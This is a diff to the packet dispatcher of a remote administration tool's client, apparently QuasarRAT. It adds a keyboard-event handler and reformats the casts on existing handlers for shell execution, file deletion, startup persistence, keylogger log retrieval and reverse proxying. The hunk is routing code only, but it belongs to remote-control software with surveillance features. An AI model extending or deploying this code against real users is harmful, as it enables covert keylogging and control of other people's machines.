@@ -71,62 +71,66 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleDoMouseEvent((ServerPackets.DoMouseEvent)packet, client);
             }
+            else if (type == typeof(ServerPackets.DoKeyboardEvent))
+            {
+                CommandHandler.HandleDoKeyboardEvent((ServerPackets.DoKeyboardEvent) packet, client);
+            }
             else if (type == typeof(ServerPackets.GetSystemInfo))
             {
-                CommandHandler.HandleGetSystemInfo((ServerPackets.GetSystemInfo)packet, client);
+                CommandHandler.HandleGetSystemInfo((ServerPackets.GetSystemInfo) packet, client);
             }
             else if (type == typeof(ServerPackets.DoVisitWebsite))
             {
-                CommandHandler.HandleDoVisitWebsite((ServerPackets.DoVisitWebsite)packet, client);
+                CommandHandler.HandleDoVisitWebsite((ServerPackets.DoVisitWebsite) packet, client);
             }
             else if (type == typeof(ServerPackets.DoShowMessageBox))
             {
-                CommandHandler.HandleDoShowMessageBox((ServerPackets.DoShowMessageBox)packet, client);
+                CommandHandler.HandleDoShowMessageBox((ServerPackets.DoShowMessageBox) packet, client);
             }
             else if (type == typeof(ServerPackets.DoClientUpdate))
             {
-                CommandHandler.HandleDoClientUpdate((ServerPackets.DoClientUpdate)packet, client);
+                CommandHandler.HandleDoClientUpdate((ServerPackets.DoClientUpdate) packet, client);
             }
             else if (type == typeof(ServerPackets.GetMonitors))
             {
-                CommandHandler.HandleGetMonitors((ServerPackets.GetMonitors)packet, client);
+                CommandHandler.HandleGetMonitors((ServerPackets.GetMonitors) packet, client);
             }
             else if (type == typeof(ServerPackets.DoShellExecute))
             {
-                CommandHandler.HandleDoShellExecute((ServerPackets.DoShellExecute)packet, client);
+                CommandHandler.HandleDoShellExecute((ServerPackets.DoShellExecute) packet, client);
             }
             else if (type == typeof(ServerPackets.DoPathRename))
             {
-                CommandHandler.HandleDoPathRename((ServerPackets.DoPathRename)packet, client);
+                CommandHandler.HandleDoPathRename((ServerPackets.DoPathRename) packet, client);
             }
             else if (type == typeof(ServerPackets.DoPathDelete))
             {
-                CommandHandler.HandleDoPathDelete((ServerPackets.DoPathDelete)packet, client);
+                CommandHandler.HandleDoPathDelete((ServerPackets.DoPathDelete) packet, client);
             }
             else if (type == typeof(ServerPackets.DoShutdownAction))
             {
-                CommandHandler.HandleDoShutdownAction((ServerPackets.DoShutdownAction)packet, client);
+                CommandHandler.HandleDoShutdownAction((ServerPackets.DoShutdownAction) packet, client);
             }
             else if (type == typeof(ServerPackets.GetStartupItems))
             {
-                CommandHandler.HandleGetStartupItems((ServerPackets.GetStartupItems)packet, client);
+                CommandHandler.HandleGetStartupItems((ServerPackets.GetStartupItems) packet, client);
             }
             else if (type == typeof(ServerPackets.DoStartupItemAdd))
             {
-                CommandHandler.HandleDoStartupItemAdd((ServerPackets.DoStartupItemAdd)packet, client);
+                CommandHandler.HandleDoStartupItemAdd((ServerPackets.DoStartupItemAdd) packet, client);
             }
             else if (type == typeof(ServerPackets.DoStartupItemRemove))
             {
-                CommandHandler.HandleDoStartupItemRemove((ServerPackets.DoStartupItemRemove)packet, client);
+                CommandHandler.HandleDoStartupItemRemove((ServerPackets.DoStartupItemRemove) packet, client);
             }
             else if (type == typeof(ServerPackets.DoDownloadFileCancel))
             {
-                CommandHandler.HandleDoDownloadFileCancel((ServerPackets.DoDownloadFileCancel)packet,
+                CommandHandler.HandleDoDownloadFileCancel((ServerPackets.DoDownloadFileCancel) packet,
                     client);
             }
             else if (type == typeof(ServerPackets.GetKeyloggerLogs))
             {
-                CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
+                CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs) packet, client);
             }
             else if (type == typeof(ReverseProxy.Packets.ReverseProxyConnect) ||
                      type == typeof(ReverseProxy.Packets.ReverseProxyConnectResponse) ||
